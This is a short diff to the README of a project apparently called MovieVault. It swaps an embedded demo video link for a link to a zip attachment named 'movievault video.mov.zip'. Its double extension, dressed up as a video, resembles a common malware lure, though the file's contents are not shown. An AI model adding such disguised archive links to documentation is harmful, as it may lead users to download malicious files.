@@ -114,7 +114,10 @@ The local database is excluded from GitHub through `.gitignore`.
 
 *Add a screenshot of the MovieVault search interface here.*
 
-https://github.com/user-attachments/assets/cf49f997-2b06-42d8-a2c4-5b5392ff726f
+[movievault video.mov.zip](https://github.com/user-attachments/files/32421062/movievault.video.mov.zip)
+
+
+
 
 ### Movie Collection
 
